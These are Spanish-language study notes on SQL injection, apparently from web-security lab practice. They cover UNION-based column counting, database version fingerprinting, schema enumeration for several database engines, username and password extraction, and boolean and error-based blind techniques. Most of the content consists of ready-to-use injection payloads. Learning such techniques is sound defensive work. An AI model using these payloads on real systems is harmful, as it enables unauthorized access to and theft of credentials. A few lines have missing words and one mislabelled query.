La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza en su base de datos. Esto puede permitir que un atacante vea datos que normalmente no puede recuperar. Esto puede incluir datos que pertenecen a otros usuarios, o cualquier otro dato al que la aplicación pueda acceder. En muchos casos, un atacante puede modificar o eliminar estos datos, provocando cambios persistentes en el contenido o comportamiento de la aplicación.

En algunas situaciones, un atacante puede escalar un ataque de inyección SQL para comprometer el servidor subyacente u otra infraestructura de back-end. También puede permitirles realizar ataques de denegación de servicio.

--- 

**SQLi con UNION**

### Los dos requisitos fundamentales

1. **Mismo número de columnas:** Si la consulta original pide 3 datos (ej. Nombre, Precio, Stock), tu consulta inyectada **obligatoriamente** debe pedir 3 datos también.
    
2. **Tipos de datos compatibles:** Si la primera columna original es un texto, tu primera columna inyectada debe ser un texto (o algo que la base de datos acepte como tal).

---

### ¿Cómo saber cuántas columnas tiene la consulta original?

Como no vemos el código interno, usamos dos "trucos" de tanteo:

#### Método 1: El uso de `ORDER BY`

Este comando sirve para ordenar resultados por el número de columna.

- Inyectas `' ORDER BY 1--`: Si la página carga bien, hay al menos 1 columna.
    
- Inyectas `' ORDER BY 2--`: Si carga bien, hay al menos 2.
    
- Inyectas `' ORDER BY 3--`: Si de repente sale un **error** (como el de la imagen: _"position number 3 is out of range"_), ya lo tienes: **sabes que solo hay 2 columnas**.

#### Método 2: El uso de `UNION SELECT NULL`

Aquí intentas unir una fila llena de valores "nulos" (vacíos).

- Pruebas con: `' UNION SELECT NULL--`
    
- Si da error, pruebas con: `' UNION SELECT NULL, NULL--`
    
- Sigues añadiendo `NULL` hasta que la página **no dé error** o veas una fila vacía nueva.
    
- **¿Por qué usar `NULL`?** Porque el `NULL` es "comodín": encaja con cualquier tipo de dato (números, fechas o texto), así que solo te preocupas por acertar el número de columnas.

---

### Resumen visual

Si la web hace esto internamente: `SELECT nombre, descripcion FROM productos WHERE id = [TU_INYECCION]`

Tú inyectas: `1' UNION SELECT NULL, NULL--`

La base de datos ejecuta: `SELECT nombre, descripcion FROM productos WHERE id = 1 UNION SELECT NULL, NULL`

Como el número de `NULL` (2) coincide con las columnas originales (`nombre`, `descripcion`), la consulta funciona y ya estás listo para extraer datos reales sustituyendo esos `NULL` por nombres de tablas o usuarios.

Un ataque UNION por inyección SQL te permite recuperar los resultados de una consulta inyectada. Los datos interesantes que quieres recuperar suelen estar en forma de cuerdas. Esto significa que necesitas encontrar una o más columnas en los resultados originales de la consulta cuyo tipo de dato sea, o sea compatible con, los datos de cadena.

Después de determinar el número de columnas necesarias, puedes sondear cada columna para comprobar si puede contener datos de cadena. Puedes enviar una serie de cargas útiles que colocan un valor de cadena en cada columna por turno. Por ejemplo, si la consulta devuelve cuatro columnas, se enviaría: `UNION SELECT`

```
' UNION SELECT 'a',NULL,NULL,NULL-- 
' UNION SELECT NULL,'a',NULL,NULL-- 
' UNION SELECT NULL,NULL,'a',NULL-- 
' UNION SELECT NULL,NULL,NULL,'a'--
```

--- 

Cuando hayas determinado el número de columnas devueltas por la consulta original y encontrado cuáles columnas pueden contener datos de cadena, estás en posición de recuperar datos interesantes.

Supongamos que:

- La consulta original devuelve dos columnas, ambas capaces de contener datos de cadena.
- El punto de inyección es una cadena comillada dentro de la cláusula. `WHERE`
- La base de datos contiene una tabla llamada con las columnas y . `users``username``password`

En este ejemplo, puedes recuperar el contenido de la tabla enviando la entrada: `users`

`' UNION SELECT username, password FROM users--`

Para realizar este ataque, necesitas saber que existe una tabla llamada con dos columnas llamadas y . Sin esta información, tendrías que adivinar los nombres de las tablas y columnas. Todas las bases de datos modernas ofrecen formas de examinar la estructura de la base de datos y determinar qué tablas y columnas contienen. `users``username``password`

----

# Identificar nombres de tablas y de columnas

Primero, identificamos la versión:

- PostgreSQL y MySQL:
```
' UNION SELECT NULL, VERSION(), NULL--
```
- Microsoft SQL Server:
```
' UNION SELECT NULL, @@VERSION, NULL--
``` 
- Oracle:
```
' UNION SELECT NULL, BANNER, NULL FROM v$version--
```

**En MYSQL, no se usa '--', se usa '#'**

Para identificar esas cosas rápido, usamos 

```
' ORDER BY 1--
```

Si nos da error, entonces sabemos que probablemente use # en vez de --


# TRUCO PARA LIMPIAR EL RUIDO

```
GET /filter?category=EXISTENO' UNION 
```

Nos inventamos una categoría para que no se nos llene de mierda
## PostgreSQL y MySQL

Luego identificamos las tablas con sus propias instrucciones, como por ejemplo

```
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = 'public'--
```

Otra opción es directamente

```
' UNION SELECT * FROM information_schema.tables--
```

Aunque suele fallar, porque si espera 2 columnas, eso igual son 10 columnas, entonces da error

Con MySQL

```
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = database()#
```

Y finalmente las columnas, con el nombre de una tabla dada anteriormente, pongamos "users"

```
' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = 'users'--
```

Otra opción sería 

```
' UNION SELECT * FROM information_schema.columns WHERE table_name = 'Users'--
```

Una vez tenemos los datos de "users", que pongamos que son "username" y "password", extraemos la información

```
' UNION SELECT NULL, username || ':' || password, NULL FROM users--
```

_**Truco pro para sacar el usuario y la contraseña a la vez ene sa misma columna**_

```
username || ' === ' || password
```

## Microsoft SQL Server (T-SQL)

SQL Server usa el signo `+` para unir textos y sus tablas de sistema suelen empezar por `sys.`.

Listar tablas:

`' UNION SELECT NULL, name, NULL FROM sys.tables--`

Listar columnas (para la tabla "users"):

`' UNION SELECT NULL, name, NULL FROM sys.columns WHERE object_id = OBJECT_ID('users')--`

Extraer información (Concatenación con `+`):

`' UNION SELECT NULL, username + ':' + password, NULL FROM users--`

## Oracle

Oracle es el más "especial" por dos motivos: requiere siempre la cláusula `FROM` (incluso para el `NULL`) y usa `||` como Postgres, pero sus tablas de sistema tienen nombres distintos.

Listar tablas:

`' UNION SELECT NULL, table_name, NULL FROM all_tables--` _(Nota: Aquí verás muchísimas tablas. A veces es mejor usar `user_tables` para ver solo las del usuario actual)._

Listar columnas (para la tabla "USERS"):

`' UNION SELECT NULL, column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--` _(Importante: Oracle suele guardar los nombres de tablas en **MAYÚSCULAS** internamente)._

Extraer información (Requiere `FROM dual` si no hay tabla, pero aquí usamos `FROM users`):

`' UNION SELECT NULL, username || ':' || password, NULL FROM users--`

# Blind SQL

Aquí es igual pero sin recibir la respuesta en la página como tal, con lo que hay que usar otros métodos diferentes al UNION

Hay que jugar a las adivinanzas, **con preguntas de sí o no.**

Tenemos que fijarnos en el comportamiento de la página, en este caso, sabemos que cuando es algo correcto nos dice **"Bienvenido de nuevo".**

Por lo que podemos usar la siguiente consulta

```
...xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Aministrator'), 1, 1) > 'm
```

- **`...xyz'`**: Cierra la consulta original para que podamos inyectar la nuestra. Se refiere a lo que ya está escrito, como el **Tracking Id** de la **Cookie**

- **`SUBSTRING(..., 1, 1)`**: Esta función corta un trozo del texto. El `1, 1` significa: "Empieza en la posición 1 y agarra solo 1 carácter". Es decir, estamos analizando la **primera letra** de la contraseña.

- **`> 'm'`**: Aquí le preguntamos a la base de datos: "¿Esa primera letra es mayor que la 'm' (siguiendo el orden del alfabeto)?".

Y seguiríamos posición por posición hasta pillar la contraseña

Con Burp, podemos usar el **Intruder** con el **Cluster Bomb** para lograrlo más rápido

Para la longitud de la contraseña:

```
TrackingId=...G' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
```

# Error-Based Blind SQLi

En caso de no tener ningun mensaje en la web para decirnos si si o si no, forzamos a la web a explotar, **saltando un mensaje de error cuando es si**

```
xyz' AND (SELECT CASE WHEN (SUBSTRING(Password,1,1)='a') THEN 1/0 ELSE 'a' END FROM Users WHERE Username='Administrator')='a
```

En este ejemplo, si nos salta un error 500 es que intentó dividir 1/0, con lo que es 'a', y si es incorrecto, devolvemos una 'a', tal que 'a'='a', que seria 200 de correcto

Para sacar la contraseña:

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a
```